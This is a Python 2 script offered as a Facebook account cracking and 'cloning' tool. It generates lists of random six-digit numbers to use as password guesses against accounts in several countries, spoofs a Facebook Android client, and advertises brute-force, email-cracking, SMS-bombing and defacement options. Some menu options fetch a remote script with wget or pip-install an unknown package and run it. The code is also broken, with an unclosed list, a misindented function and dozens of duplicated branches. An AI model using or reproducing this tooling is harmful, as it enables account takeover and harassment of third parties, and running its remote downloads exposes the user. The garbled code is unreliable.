import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(99265):
    nmbr = random.randint(111111, 999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()
 
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
 
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 .README.md')
 
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
 
def exb():
    print '[!] Exit Successfully'
    os.sys.exit()
 
 
def exxb():
    print '[!] \x1b[1;91mTHIS OPTION NOT AVAILABLE AT THE MOMENT.BUT \x1b[3;92;40m COM\x1b[1;95mING SO\x1b[1;97mON \x1b[1;91m\x1b[0;34;40m'
    os.sys.exit()
 
 
def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
 
 
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3.0 / 200)
 
 
def tik():
    titik = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mLoa\x1b[1;90mding \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)
 
 
def lodhirt():
    lodhirt = [
     'CYBER-HACKER', '      ', 'CYBER-HACKER', '      ', 'ARBAB-ALI', '      ', 'ARBAB-ALI', '      ', 'RIGHT-HANDED', '      ', 'PLAYER-1.0268', '      ', 'TEAM-CYBER', '      ', 'TEAM-CYBER', '      ', 'ARBAB-MEMON', '      ', 'TEAM CYBER', 'CYBER-GANGE', '      ', 'LEADER', '      ', 'ARBAB-ALI', '      ', 'TEAM-1.0286', '      ', 'CYBER-PLAYER', '      ', 'GANGE-LEADER', '      ', 'BRANDED', '      ', 'ARBAB-MEMON', '      ', 'ARBAB-ALI', '      ', 'ARBAB-ALI\n']
    for o in lodhirt:
        print '\r\x1b[1;94m                     \x1b[1;92m' + o,
        sys.stdout.flush()
        time.sleep(0.1)
 
 
def jaalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(2.0 / 9900)
 
 
def t():
    time.sleep(1)
 
 
def cb():
    os.system('clear')
 ##### Dev : Arbab Ali Memon#####
##### LOGO #####
logo='''
\x1b[1;96m░█████╗░██████╗░██████╗░░█████╗░██████╗░
\x1b[1;97m██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗
\x1b[1;95m███████║██████╔╝██████╦╝███████║██████╦╝
\x1b[1;94m██╔══██║██╔══██╗██╔══██╗██╔══██║██╔══██╗
\x1b[1;91m██║░░██║██║░░██║██████╦╝██║░░██║██████╦╝
\x1b[1;97m╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═════╝░
\x1b[1;93m--------------------------------------------------------------
\x1b[1;92m➣  YouTube  : CYBER GANGE HIDDEN TRICKER
\x1b[1;91m➣  Facebook : ARBAB ALI MEMON
\x1b[1;93m➣  Note     : CYBER PLAYER R.H.S 1.0286
\x1b[1;95m➣  Warning  : IF NOT WORK THAN USE FREE VPN
\x1b[1;96m➣  Whatsapp : +923003023263
\x1b[1;97m➣  Note     : ANY KIND PROBLEM MSG ME.
\x1b[1;94m➣  Disclamiar :AWAY FROM ILLIGAL WAY.
\x1b[1;93m--------------------------------------------------------------"""
                                '''  

back = 0
successful = []
cpb = []
oks = [
id = []
 
def menu():
    os.system('clear')
    print logo
    lodhirt()
    print
    print '       \x1b[4;96mINDIAN MENU\x1b[0;37;40m                 \x1b[4;96mINTERNATIONAL\x1b[0;37;40m'
    print
    jaalan('\x1b[1;91m[\x1b[1;92m1\x1b[1;91m]  \x1b[1;93mINDIAN 6 DIGIT CLONE     \x1b[1;91m[\x1b[1;92m5\x1b[1;91m]  \x1b[1;93mUSA 6 DIGIT CLONE')
    jaalan('\x1b[1;91m[\x1b[1;92m2\x1b[1;91m]  \x1b[1;93mINDIAN 7 DIGIT CLONE     \x1b[1;91m[\x1b[1;92m6\x1b[1;91m]  \x1b[1;93mITALY 6 DIGIT CLONE')
    jaalan('\x1b[1;91m[\x1b[1;92m3\x1b[1;91m]  \x1b[1;93mFACEBOOK AUTO REPORT     \x1b[1;91m[\x1b[1;92m7\x1b[1;91m]  \x1b[1;93mSPAIN 6 DIGIT CLONE')
    jaalan('\x1b[1;91m[\x1b[1;92m4\x1b[1;91m]  \x1b[1;93mALL INDIA ID HACK        \x1b[1;91m[\x1b[1;92m8\x1b[1;91m]  \x1b[1;93mPOLAND 6 DIGIT CLONE')
    jaalan('\x1b[1;91m[\x1b[1;92m9\x1b[1;91m]  \x1b[1;93mTARGET ID HACK {BRUTE} ')
    print
    print '     \x1b[4;96mBANGLADESHI MENU\x1b[0;37;40m                \x1b[4;96mMORE TOOLS\x1b[0;37;40m'
    print
    jaalan('\x1b[1;91m[\x1b[1;92m11\x1b[1;91m]  \x1b[1;90m6 DIGIT CRACKER         \x1b[1;91m[\x1b[1;92m15\x1b[1;91m]  \x1b[1;90mEMAIL CRACKER')
    jaalan('\x1b[1;91m[\x1b[1;92m12\x1b[1;91m]  \x1b[1;90m7 DIGIT CRACKER         \x1b[1;91m[\x1b[1;92m16\x1b[1;91m]  \x1b[1;90mSMS CALL BOMBER')
    jaalan('\x1b[1;91m[\x1b[1;92m13\x1b[1;91m]  \x1b[1;90m8 DIGIT CRACKER         \x1b[1;91m[\x1b[1;92m17\x1b[1;91m]  \x1b[1;90mWEBSITE DEFACEMENT')
    jaalan('\x1b[1;91m[\x1b[1;92m14\x1b[1;91m]  \x1b[1;90m11 DIGIT CRACKER        \x1b[1;91m[\x1b[1;92m18\x1b[1;91m]  \x1b[1;90mDEATH MAIL GRABBER')
    print
    print
    jalan('    \x1b[1;91m[\x1b[1;93m20\x1b[1;91m] \x1b[1;92mUPDATE \x1b[1;91m[\x1b[1;93m21\x1b[1;91m] \x1b[1;92mFOLLOW \x1b[1;91m[\x1b[1;93m22\x1b[1;91m] \x1b[1;92mCONTACT \x1b[1;91m[\x1b[1;93m00\x1b[1;91m] \x1b[1;92mEXIT')
    action()
    
    def action():
    global cpb
    global oks
    bch = raw_input('\n\n \x1b[1;96m>   ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 4 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 9540 TO 9970  :  ')
            k = '+91'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '2':
        tik()
        os.system('clear')
        os.system('pip2 install --upgrade babaindseven')
        os.system('clear')
        print
        psb('7 DIGIT INDIAN CRACKER UPDATED SUCCESSFULLY')
        os.system('clear')
        os.system('babaindseven')
        menu()
    elif bch == '3':
        tik()
        os.system('clear')
        if not os.path.isfile('.report.py'):
            jalan('DONT USE FACEBOOK AUTO REPORT. ONLY TIME WASTE. SO I RECOMMEND YOU TO DONT USE IT. BUT IF YOU WANT TO WASTE YOUR TIME THEN USE IT')
            time.sleep(1)
            os.system('wget https://raw.githubusercontent.com/ArbabMemon/ArbabMemon.github.io/Hacker/.Hacker.py')
            os.system('clear')
            os.system('python2 .report.py')
        else:
            os.system('python2 .report.py')
            time.sleep(0.001)
            raw_input('\n[\x1b[1;96mPRESS ENTER TO EXIT]')
            exb()
    elif bch == '4':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('CHOOSE ANY CODE \n\n     \x1b[1;93m 7862, 8151, 3153, 2568, 4015, 7182, 9172, 2024, 7018, 3033, 7037, 8032, 9996, 7087  :  ')
            k = '+91'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '5':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 4 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 3280 TO 3910  :  ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '6':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 601 TO 770  :  ')
            k = '+39'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '7':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 510 TO 690  :  ')
            k = '+34'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif bch == '5':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('CHOOSE ANY CODE \n\n     \x1b[1;93m 7862, 8151, 3153, 2568, 4015, 7182, 9172, 2024, 7018, 3033, 7037, 8032, 9996, 7087  :  ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '6':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 4 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 3280 TO 3910  :  ')
            k = '+39'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '7':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 601 TO 770  :  ')
            k = '+34'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '8':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 510 TO 690  :  ')
            k = '+48'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif bch == '9':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('CHOOSE ANY CODE \n\n     \x1b[1;93m 7862, 8151, 3153, 2568, 4015, 7182, 9172, 2024, 7018, 3033, 7037, 8032, 9996, 7087  :  ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '10':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 4 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 3280 TO 3910  :  ')
            k = '+39'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '11':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 601 TO 770  :  ')
            k = '+34'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '12':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 510 TO 690  :  ')
            k = '+48'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif bch == '13':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('CHOOSE ANY CODE \n\n     \x1b[1;93m 7862, 8151, 3153, 2568, 4015, 7182, 9172, 2024, 7018, 3033, 7037, 8032, 9996, 7087  :  ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '14':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 4 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 3280 TO 3910  :  ')
            k = '+39'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '15':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 601 TO 770  :  ')
            k = '+34'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '16':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 510 TO 690  :  ')
            k = '+48'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif bch == '17':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('CHOOSE ANY CODE \n\n     \x1b[1;93m 7862, 8151, 3153, 2568, 4015, 7182, 9172, 2024, 7018, 3033, 7037, 8032, 9996, 7087  :  ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '18':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 4 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 3280 TO 3910  :  ')
            k = '+39'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '19':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 601 TO 770  :  ')
            k = '+34'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '20':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 510 TO 690  :  ')
            k = '+48'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif bch == '21':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('CHOOSE ANY CODE \n\n     \x1b[1;93m 7862, 8151, 3153, 2568, 4015, 7182, 9172, 2024, 7018, 3033, 7037, 8032, 9996, 7087  :  ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '22':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 4 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 3280 TO 3910  :  ')
            k = '+23'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '24':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 601 TO 770  :  ')
            k = '+34'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '25':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 510 TO 690  :  ')
            k = '+48'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif bch == '26':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('CHOOSE ANY CODE \n\n     \x1b[1;93m 7862, 8151, 3153, 2568, 4015, 7182, 9172, 2024, 7018, 3033, 7037, 8032, 9996, 7087  :  ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '27':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 4 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 3280 TO 3910  :  ')
            k = '+39'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '28':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 601 TO 770  :  ')
            k = '+34'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '29':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 510 TO 690  :  ')
            k = '+48'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif bch == '30':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('CHOOSE ANY CODE \n\n     \x1b[1;93m 7862, 8151, 3153, 2568, 4015, 7182, 9172, 2024, 7018, 3033, 7037, 8032, 9996, 7087  :  ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '31':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 4 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 3280 TO 3910  :  ')
            k = '+39'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '32':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 601 TO 770  :  ')
            k = '+34'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '33':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 510 TO 690  :  ')
            k = '+48'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif bch == '34':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('CHOOSE ANY CODE \n\n     \x1b[1;93m 7862, 8151, 3153, 2568, 4015, 7182, 9172, 2024, 7018, 3033, 7037, 8032, 9996, 7087  :  ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '35':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 4 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 3280 TO 3910  :  ')
            k = '+39'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '36':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 601 TO 770  :  ')
            k = '+34'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '37':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 510 TO 690  :  ')
            k = '+48'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif bch == '38':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('CHOOSE ANY CODE \n\n     \x1b[1;93m 7862, 8151, 3153, 2568, 4015, 7182, 9172, 2024, 7018, 3033, 7037, 8032, 9996, 7087  :  ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '39':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 4 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 3280 TO 3910  :  ')
            k = '+39'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '40':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 601 TO 770  :  ')
            k = '+34'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '41':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;93m TYPE ANY CODE FROM 510 TO 690  :  ')
            k = '+48'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
